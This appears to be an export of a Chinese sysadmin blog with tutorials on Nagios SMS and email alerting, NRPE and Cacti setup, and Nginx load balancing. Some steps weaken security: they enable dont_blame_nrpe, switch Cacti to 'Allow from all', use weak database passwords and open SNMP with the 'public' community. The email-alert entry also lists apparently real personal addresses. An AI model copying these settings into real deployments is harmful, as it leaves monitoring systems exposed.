#这里的$2是nagios发送短信的第二个变量URL="http://192.168.100.100:8888/services/msgsend.asmx/SendMsg?userCode=$&#123;$Uid&#125;&amp;userPass=$&#123;Key&#125;&amp;DesNo=$&#123;MOBILE_NUMBER&#125;&amp;Msg=$&#123;MESSAGE_ENCODE&#125;$&#123;QIANMING&#125;&amp;Channel=0"#这里的URL是胡乱写的，不可能暴漏自己公司的接口哈，但是格式大体是这样的，到时候接口方会提供URL的格式的# Send it set -x $&#123;CURL&#125; -s --connect-timeout $&#123;TIMEOUT&#125; "$&#123;URL&#125;" 测试脚本 1bash /root/duanxin.sh "手机号" “内容” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果脚本报错，可以根据报错信息检查脚本，如果脚本没有问题，但是短信发不出去，可以看看sms_send_log里面的报错信息 nagios 调用脚本，不要忘记脚本要给执行权限，一般脚本放在root目录下，nagios在调用脚本时是不能访问root目录的，所以你还要看你/root目录的权限 123456789define command &#123; command_name host-notify-by-sms command_line /root/duanxin.sh $CONTACTPAGER$ "$HOSTNAME$ $HOSTSTATE$ $SHORTDATETIME$" &#125;define command &#123; command_name service-notify-by-sms command_line /root/duanxin.sh $CONTACTPAGER$ "$SERVICESTATE$ $SERVICEOUTPUT$ $HOSTALIAS$/$SERVICEDESC$ $SHORTDATETIME$" &#125; 看到这里大家可能对上面脚本的$1和$2概念比较模糊，其实刚开始我也迷糊，nagios怎么知道我要发送的号码呢，后来研究发现，$CONTACTPAGER$这个量就是nagios内部联系人的变量，也就是他会调用我们在contacts.cfg里面定义的手机号，而我们脚本里面定义的$1就对应$CONTACTPAGER$，$2就对应”$HOSTNAME$ $HOSTSTATE$ $SHORTDATETIME$”]]></content>
      <tags>
        <tag>Nagios</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nagios 监控客户端]]></title>
    <url>%2F2017%2F08%2F14%2FNagios%2F2.%20nagios%20%E7%9B%91%E6%8E%A7%E5%AE%A2%E6%88%B7%E7%AB%AF%2F</url>
    <content type="text"><![CDATA[nagios 监控客户端&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在客户端机器阿航安装 epel 扩展源 1yum install -y epel-release &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装 nagios 以及 nagios-plugins 1yum install -y nagios-plugins nagios-plugins-all nrpe nagios-plugins-nrpe &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编辑配置文件 1vim /etc/nagios/nrpe.cfg &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;找到 “allowed_hosts=127.0.0.1” 改为 “allowed_hosts=127.0.0.1，192.168.0.62 ” 后面的 ip 为服务端 ip ； 找到 “dont_blame_nrpe=0” 改为 “dont_blam_nrpe=1” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;启动客户端 1/etc/init.d/nrpe start &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;客户端配置好以后，在到服务端继续配置。客户端 ip 为 192.168.0.98，下面定义子配置文件。（以下操作在服务端上完成） 12[root@nagios ~]# cd /etc/nagios/conf.d/[root@nagios conf.d]# vim /192.168.0.98.cfg &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;增加配置 12345678910111213141516171819202122232425262728293031323334define host&#123; use linux-server host_name 192.168.0.98 alias 0.98 address 192.168.0.98&#125;define service&#123; use generic-service host_name 192.168.0.98 service_description check_ping check_command check_ping!100.0,20%!200.0,50% max_check_attempts 5 normal_check_interval 1&#125;define service&#123; use generic-service host_name 192.168.0.98 service_description check_ssh check_command check_ssh max_check_attempts 5 normal_check_interval 1 notification_interval 60&#125;define service&#123; use generic-service host_name 192.168.0.98 service_description check_http check_command check_http max_check_attempts 5 normal_check_interval 1&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： “max_check_attempts 5” ：表示当nagios检测到问题时，一共尝试检测5次都有问题才会告警，如果该数值为1，那么检测到问题立即告警 “normal_check_interval 1”：表示重新检测的时间间隔，单位是分钟，默认是3分钟 “notification_interval 60”：表示在服务出现异常后，故障一直没有解决，nagios再次对使用者发出通知的时间。单位是分钟。如果你认为，所有的事件只需要一次通知就够了，可以把这里的选项设为0。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上服务不依赖于客户端 nrpe 服务，可以想象，在子机电脑上可以使用 ping 或者 telnet 探测远程任何一台机器是否存活、是否开启某个端口或服务。而当想要检测客户端上的某个具体服务的情况时，就需要借助于 nrpe 了，比如想知道客户端机器的负载或磁盘使用情况。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编辑完成配置文件后，检测配置是否有错 1[root@nagios conf.d]# nagios -v /etc/nagios/nagios.cfg &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;再服务端重启一下 nagios 服务 1[root@nagios conf.d]# service nagios restart &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后在浏览器里访问 nagios ，刷新会发现多出来一台主机，并且多出来三个服务。只不过这三个服务并不是我们想要的，想要监控系统负载，监控磁盘使用率等服务，这时候就要使用 nrpe 服务了。继续在服务端上添加服务。 1[root@nagios ~]# vim /etc/nagios/objects/commands.cfg &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;增加 1234define command&#123; command_name check_nrpe command_line $USER1$/check_nrpe -H $HOSTADDRESS$ -c $ARG1$&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后继续编辑 1[root@nagios conf.d]# vim 192.168.0.98.cfg &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;增加内容 123456789101112131415161718192021222324252627define service&#123; use generic-service host_name 192.168.0.98 service_description check_load check_command check_nrpe!check_load max_check_attempts 5 normal_check_interval 1&#125;define service&#123; use generic-service host_name 192.168.0.98 service_description check_disk_sda1 check_command check_nrpe!check_sda1 max_check_attempts 5 normal_check_interval 1&#125;define service&#123; use generic-service host_name 192.168.0.98 service_description check_disk_sda3 check_command check_nrpe!check_sda3 max_check_attempts 5 normal_check_interval 1&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：“check_nrpe!check_load” 这里的 check_nrpe 就是在 commands.cfg 刚刚定义的，check_load 是远程主机上的一个检测脚本。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在远程主机上编辑 nrpe.cfg 配置文件 1[root@nagios conf.d]# vim /etc/nagios/nrpe.cfg &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;搜索 check_load ，这行就是在服务器上要执行的脚本了。然后把 check_hda1 更改一下：/dev/hds1 改为 ，/dev/sda1 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;再加一行 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;客户端上重启一下 nrpe 服务 1[root@lnmp ~]# service nrpe restart &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;服务端也重启下 nagios 服务 1[root@nagios conf.d]# service nagios restart &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;再到浏览器刷新，会看到又多出来三个服务 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;稍微等一会就可以查看到具体的状态了。]]></content>
      <tags>
        <tag>Nagios</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nagios配置邮件告警]]></title>
    <url>%2F2017%2F08%2F14%2FNagios%2F3.%20nagios%E9%85%8D%E7%BD%AE%E9%82%AE%E4%BB%B6%E5%91%8A%E8%AD%A6%2F</url>
    <content type="text"><![CDATA[nagios配置邮件告警&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;目前 nagios 只能在浏览器上查看各个服务的状态，当某个机器宕掉或者某个服务宕掉时，我们是不知道的，因为我们不可能一直盯着服务器看。这时候，就需要用到警告系统了，让它自动化，当发现问题时及时通知到我们。下面配置使用发邮件的方式来实现告警。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以下操作都在服务器上完成。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先定义发邮件接收者。 1[root@nagios ~]# vim /etc/nagios/objects/contacts.cfg &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;增加 123456789101112131415161718192021define contact&#123; contact_name 123 use generic-contact alias yanyi email 18983111118@189.cn&#125;define contact&#123; contact_name 456 use generic-contact alias aaa email 89429541@qq.com&#125;define contactgroup&#123; contactgroup_name common alias common members 123,456&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： contacts.cfg 里面既可以定义 user 也可以定义 group ，先定义两个 user 123 和 456 ，然后把这两个 user 加入到 common 组里面。等会发邮件就发给 common 组就可以了，那这样 18983111118@189.cn 和 89429541@qq.com 都会收到邮件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后在需要告警的服务里面加上 contactgroup 1[root@nagios ~]# vim /etc/nagios/conf.d/192.168.0.98.cfg &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;针对 check_load 服务增加告警相关的配置 123456789101112define service&#123; use generic-service host_name 192.168.0.98 service_description check_load check_command check_nrpe!check_load max_check_attempts 5 normal_check_interval 1 contact_groups common notifications_enabled 1 notification_period 24x7 notification_options w,u,c,r&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：notifications_enabled 1 表示是否开启提醒功能。 1 为开启，0 为禁用。一般，这个选项会在主配置文件 （nagios.cfg） 中定义，效果相同。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;notification_period 24×7 表示发送提醒的时间段。非常重要的主机（服务）定义为问题发生，都不会发送提醒。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;notification_options:w,u,c,r 表示 service 的状态。w 为 waning，u 为 unknown，c 为 critical，r 为 recover（恢复了），类似的还有一个 host对应的状态：d,u,r d 状态为 DOWN，u 状态为 UNREACHABLE，r 状态恢复为 OK，需要加入到 host 的定义配置里。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编辑完成配置文件后，需要重启 nagios 服务 1[root@nagios ~]# service nagios restart]]></content>
      <tags>
        <tag>Nagios</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cacti增加客户端监控]]></title>
    <url>%2F2017%2F08%2F13%2FCacti%2F2.%20cacti%E5%A2%9E%E5%8A%A0%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9B%91%E6%8E%A7%2F</url>
    <content type="text"><![CDATA[cacti增加客户端监控1.安装 snmp1[root@lnmp ~]# yum install -y net-snmp 2.修改 snmp.conf1[root@lnmp ~]# vim /etc/snmp/snmpd.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改 syslocation 以及 syscontact ，其中 syslocation 可以写本机 ip，syscontact 写管理员邮箱。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;3.启动 snmp 1[root@lnmp ~]# service snmpd start 4.cacti 增加监控&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;登录 cacti 管理后台，点控制台，再点设备，在右上角点 “add” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;描述： 写本机 ip 或自定义一个名字 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主机名：hostname 写本机 ip &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设备模版：选择 Net-SNMP Device &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;采集线程数：可以选择 2-5 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SNMP版本：改为 version 2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设置完成点右下角的创建，然后点右上角的 “Create Graphs for this Device” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Graph Types: 选择SNMP - Interface Statistics &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在下面框中选择要监控的网卡，比如我选择eth0, 在最右侧小方块里打对勾，然后点右下角的create（如果在这一步找不到网卡，可以参考cacti监控找到网卡的方法） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Graph Types: 再选择 Graph Template Based &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在下面的框中，选择你要监控的项目，比如ucd/net - Load Average &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在右侧小方块中打对勾，然后点右下角的创建 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;点击设备，选择新增加主机，选择 defaur tree 点 go &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;defaut tree 下面已经增加了添加的主机，图形一开始不会那么快出来，要等一会才可以]]></content>
      <tags>
        <tag>Cacti</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cacti 监控找到网卡的方法]]></title>
    <url>%2F2017%2F08%2F12%2FCacti%2F5.%20cacti%E7%9B%91%E6%8E%A7%E6%89%BE%E5%88%B0%E7%BD%91%E5%8D%A1%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[cacti 监控找到网卡的方法&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只需要在客户机（要监控的机器）修改配置文件： 1234[root@localhost ~]# vim /etc/snmp/snmpd.conf view systemview included .1.3.6.1.2.1.1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为: 1view systemview included .1.3.6.1.2.1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后重启snmpd服务； 1[root@localhost ~]# /etc/init.d/snmpd restart &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在web监控里面添加 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;类型选择Graph Types: SNMP - Interface Statistics 就看到客户机的网卡了。点击create。保存。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Graphs中就可以看到添加的网卡流量信息了；]]></content>
      <tags>
        <tag>Cacti</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cacti 安装]]></title>
    <url>%2F2017%2F08%2F12%2FCacti%2F1.%20cacti%20%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[cacti 安装&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：cacti 需要 apache 和 php 的支持，在这里使用 yum 安装 lamp 环境。 1.安装 epel1[root@cacti ~]# yum install -y epel-release 2.安装 lamp1[root@cacti ~]# yum install -y httpd php php-mysql mysql mysql-server mysql-devel php-gd libjpeg libjpeg-devel libpng libpng-devel 3.安装 cacti1[root@cacti ~]# yum install -y cacti net-snmp net-snmp-utils rrdtool 4.启动服务123[root@cacti ~]# /etc/init.d/httpd start[root@cacti ~]# /etc/init.d/mysqld start[root@cacti ~]# /etc/init.d/snmpd start 5.编辑 httpd.conf1[root@cacti ~]# vim /etc/httpd/conf.d/cacti.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把 “Deny from all” 改为 “Allow from all” 1[root@cacti ~]# /etc/init.d/httpd restart 6.导入数据创建 cacti 库1[root@cacti ~]# mysql -uroot -e "create database cacti" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建 cacti 用户 1[root@cacti ~]# mysql -uroot -e "grant all on cacti.* to 'cacti'@'127.0.0.1' identified by 'cacti';" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;导入 sql 文件 1[root@cacti ~]# mysql -uroot cacti &lt; /usr/share/doc/cacti-1.0.4/cacti.sql 7.编辑 cacti 配置文件1[root@cacti ~]# vim /usr/share/cacti/include/config.php &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;更改如下 12345678$database_type = "mysql";$database_default = "cacti";$database_name = "cacti";$database_hostname = "127.0.0.1";$database_username = "cacti";$database_password = "cacti";$database_port = "3306";$database_ssl = false; 8.web 访问 cacti 并安装&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;浏览器访问 http://ip/cacti/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;出现错误 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行命令 12[root@cacti ~]# set time_zone = '+8:00';[root@cacti ~]# mysql -u root mysql -p -e "GRANT SELECT ON mysql.time_zone_name TO cacti@localhost IDENTIFIED BY 'cacti';" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;继续报错 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编辑 1[root@cacti ~]# vim /etc/php.ini &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行命令 1[root@cacti ~]# mysql_tzinfo_to_sql /usr/share/zoneinfo/ | mysql -u root mysql -p &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决问题 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;报错 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先要升级 mysql 版本 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;更新 yum 源 1[root@cacti ~]# yum update &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;添加 mysql5.6 yum 源 centos6 1[root@cacti ~]# rpm -Uvh http://dev.mysql.com/get/mysql-community-release-el6-5.noarch.rpm centos7 1[root@cacti ~]# rpm -Uvh http://dev.mysql.com/get/mysql-community-release-el7-5.noarch.rpm &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后 yum 安装 mysql 就是 5.6 版本了 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;版本更换后 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;根据提示 修改 /etc/my.cnf 配置 1[root@cacti ~]# vim /etc/my.cnf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启 mysql 服务 1[root@cacti ~]# /etc/init.d/mysqld restart &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;刷新网页 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;报错 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装php-posix 1[root@cacti ~]# yum -y install php-process &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;点击下一步 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;选择默认 new primary server 下一步 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下一步 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下一步 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;选择模版，并点完成 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;登录，这里初始用户名和密码都为 admin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;初次登录强制要求更改密码。注：新密码长度必须 8 位以上，必须包含大小写字母、特殊符号、数字。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后进入监控页面 9.执行 poller.php ，生成图形，加入任务计划&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;登录有选择图形是没有显示的 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行脚本 1[root@cacti ~]# /usr/bin/php /usr/share/cacti/poller.php &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行脚本时提示很多 warning &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编辑 1[root@cacti ~]# vim /etc/php.ini &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样再次执行就不会提示 warning 了 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;添加 cron 任务计划 1[root@cacti ~]# crontab -e &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;增加 1*/5 * * * * /usr/bin/php/usr/share/cacti/poller.php &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;浏览器出现图形]]></content>
      <tags>
        <tag>Cacti</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cacti的错误]]></title>
    <url>%2F2017%2F08%2F12%2FCacti%2F3.%20cacti%20%E7%9A%84%E9%94%99%E8%AF%AF%2F</url>
    <content type="text"><![CDATA[cacti 的 “FATAL: Cannot connect to MySQL server on ‘localhost’” 错误&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;FATAL: Cannot connect to MySQL server on ‘localhost’. Please make sure you have specified a valid MySQL database name in ‘include/config.php’ 1.查看config.php下，是否配置正确&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看cactiusr的host是否有localhost 权限 1mysql -ucactiuser -h localhost -p &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看登录是否成功 ，如果登录正常则排除 2.MYSQL权限问题1SQL&gt;GRANT ALL ON cacti.* TO cactiuser@localhost IDENTIFIED BY 'somepassword'; 3.当mysql中的所有配置和cacti的config.php都正确，却还是出现该错误时，那就是mysql套接字的原因了~&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cacti会自动的去查找/var/lib/mysql/mysql.sock 该套接字，但是如果是源码安装的mysql，未指定套接字位置时，套接字的位置为/tmp/mysql.sock，由于cacti未找到/var/lib/mysql/mysql.sock，所以显示的是“Cannot connect to MySQL server on ‘localhost’” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决：做一个/tmp/mysql.sock到/var/lib/mysql/mysql.sock的软连接 1ln -s /tmp/mysql.sock /var/lib/mysql/mysql.sock]]></content>
      <tags>
        <tag>Cacti</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cacti 有图无数据参数设定]]></title>
    <url>%2F2017%2F08%2F12%2FCacti%2F4.%20cacti%20%E6%9C%89%E5%9B%BE%E6%97%A0%E6%95%B0%E6%8D%AE%E5%8F%82%E6%95%B0%E8%AE%BE%E5%AE%9A%2F</url>
    <content type="text"><![CDATA[cacti 有图无数据参数设定&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一切参数设定在客户端。（/etc/snmp/snmpd.conf） 1234567891011# sec.name source communitycom2sec notConfigUser 192.168.1.107(cacti主机的IP) public# name incl/excl subtree mask(optional)#view systemview included .1.3.6.1.2.1.1view systemview included .1.3.6.1.2.1view systemview included .1.3.6.1.2.1.25.1.1view all include .1# group context sec.model sec.level prefix read write notifaccess notConfigGroup "" any noauth exact all none none &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后重启客户端 1service snmpd restart]]></content>
      <tags>
        <tag>Cacti</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx 代理多台机器导致用户登陆异常，长连接(会话保持)解决问题]]></title>
    <url>%2F2017%2F08%2F12%2FNginx%2F36.%20nginx%20%E4%BB%A3%E7%90%86%E5%A4%9A%E5%8F%B0%E6%9C%BA%E5%99%A8%E5%AF%BC%E8%87%B4%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E5%BC%82%E5%B8%B8%EF%BC%8C%E9%95%BF%E8%BF%9E%E6%8E%A5(%E4%BC%9A%E8%AF%9D%E4%BF%9D%E6%8C%81)%E8%A7%A3%E5%86%B3%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[nginx 代理多台机器导致用户登陆异常，长连接(会话保持)解决问题&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;网站使用程序 discuzx3 访问都正常，只有用户登陆存在异常，具体的情况是这样的： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户登陆后，会马上显示未登陆，然后刷新一下或者多下又变成了登陆中。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个问题很显然是由于session导致，后台有多个web机器，当用户登陆后，会把登陆态session保存到当前web,但是再次发送请求时则会到另一台机器，所以原来的session信息找不到了。解决这个问题有两个思路： 可以把session时时同步到另外的机器。 可以让前端的调度器保持长连接，也就是说某个用户的请求在某一时间段内始终抓发到固定的一台机器上。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这两种方式，第二种更容易实现。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我使用的是nginx的代理，其中nginx有一种算法支持长连接，具体配置是这样的： 12345upstream test &#123; ip_hash;server 192.168.109.5;server 192.168.109.3;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;关键代码： ip_hash &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1E = mc^2 这样，nginx会把用户的请求一直转发到后端的某台机器。]]></content>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx负载均衡算法分析]]></title>
    <url>%2F2017%2F08%2F12%2FNginx%2F35.%20Nginx%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[Nginx负载均衡算法分析&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;随着互联网信息的爆炸性增长，负载均衡（load balance）已经不再是一个很陌生的话题，顾名思义，负载均衡即是将负载分摊到不同的服务单元，既保证服务的可用性，又保证响应足够快，给用户很好的体验。快速增长的访问量和数据流量催生了各式各样的负载均衡产品，很多专业的负载均衡硬件提供了很好的功能，但却价格不菲（如F5 BIG-IP、Citrix NetScaler、Radware等等，虽然可以解决问题，但其高昂的价格却往往令人望而却步），这使得负载均衡软件大受欢迎，nginx就是其中的一个。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nginx第一个公开版本发布于2004年，2011年发布了1.0版本。它的特点是稳定性高、功能强大、资源消耗低，从其目前的市场占有而言，nginx大有与apache抢市场的势头。其中不得不提到的一个特性就是其负载均衡功能，这也成了很多公司选择它的主要原因。本文将从源码的角度介绍nginx的内置负载均衡策略和扩展负载均衡策略，以实际的工业生产为案例，对比各负载均衡策略，为nginx使用者提供参考。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nginx的负载均衡策略可以划分为两大类：内置策略和扩展策略。内置策略包含加权轮询和ip hash，在默认情况下这两种策略会编译进nginx内核，只需在nginx配置中指明参数即可。扩展策略有很多，如fair、通用hash、consistent hash等，默认不编译进nginx内核。由于在nginx版本升级中负载均衡的代码没有本质性的变化，因此下面将以nginx1.0.15稳定版为例，从源码角度分析各个策略。 1. 加权轮询（weighted round robin）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;轮询的原理很简单，首先我们介绍一下轮询的基本流程。如下是处理一次请求的流程图： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;图中有两点需要注意，第一，如果可以把加权轮询算法分为先深搜索和先广搜索，那么nginx采用的是先深搜索算法，即将首先将请求都分给高权重的机器，直到该机器的权值降到了比其他机器低，才开始将请求分给下一个高权重的机器；第二，当所有后端机器都down掉时，nginx会立即将所有机器的标志位清成初始状态，以避免造成所有的机器都处在timeout的状态，从而导致整个前端被夯住。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;接下来看下源码。nginx源码的目录结构很清晰，加权轮询所在路径为nginx-1.0.15/src/http/ngx_http_upstream_round_robin.[c|h]，在源码的基础上，针对重要的、不易理解的地方我加了注释。首先看下ngx_http_upstream_round_robin.h中的重要声明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从变量命名中，我们就可以大致猜出其作用。其中，current_weight和weight的区别主要是前者为权重排序的值，随着处理请求会动态的变化，后者是配置值，用于恢复初始状态。接下来看下轮询的创建过程，代码如下图所示。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里有个tried变量需要做些说明。tried中记录了服务器当前是否被尝试连接过。他是一个位图。如果服务器数量小于32，则只需在一个int中即可记录下所有服务器状态。如果服务器数量大于32，则需在内存池中申请内存来存储。对该位图数组的使用可参考如下代码： 最后是实际的策略代码，逻辑很简单，代码实现也只有30行，直接上代码。 2. ip hash&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ip hash是nginx内置的另一个负载均衡的策略，流程和轮询很类似，只是其中的算法和具体的策略有些变化，如下图所示： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ip hash算法的核心实现如下图： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从代码中可以看出，hash值既与ip有关又与后端机器的数量有关。经过测试，上述算法可以连续产生1045个互异的value，这是该算法的硬限制。对此nginx使用了保护机制，当经过20次hash仍然找不到可用的机器时，算法退化成轮询。因此，从本质上说，ip hash算法是一种变相的轮询算法，如果两个ip的初始hash值恰好相同，那么来自这两个ip的请求将永远落在同一台服务器上，这为均衡性埋下了很深的隐患。 3. fair&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;fair策略是扩展策略，默认不被编译进nginx内核。其原理是根据后端服务器的响应时间判断负载情况，从中选出负载最轻的机器进行分流。这种策略具有很强的自适应性，但是实际的网络环境往往不是那么简单，因此要慎用。 4. 通用hash、一致性hash&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这两种也是扩展策略，在具体的实现上有些差别，通用hash比较简单，可以以nginx内置的变量为key进行hash，一致性hash采用了nginx内置的一致性hash环，可以支持memcache。对上面的集中负载均衡算法进行测试（测试工具polygraph），考察下面三个关键的测试指标： 均衡性：是否能够将请求均匀的发送给后端 一致性：同一个key的请求，是否能落到同一台机器 容灾性：当部分后端机器挂掉时，是否能够正常工作 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过实际的对比测试，我们对nginx各个负载均衡策略进行了验证。下面从均衡性、一致性、容灾性以及适用场景等角度对比各种策略。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;无论哪种策略都不是万金油，在具体的场景下应该选择哪种策略一定程度上依赖于使用者对这些策略的熟悉程度。希望本文的分析和测试数据能够对读者有所帮助，更希望有越来越多、越来越好的负载均衡策略产出。 参考资料http://wiki.nginx.org/HttpUpstreamConsistentHash http://wiki.nginx.org/HttpUpstreamFairModule 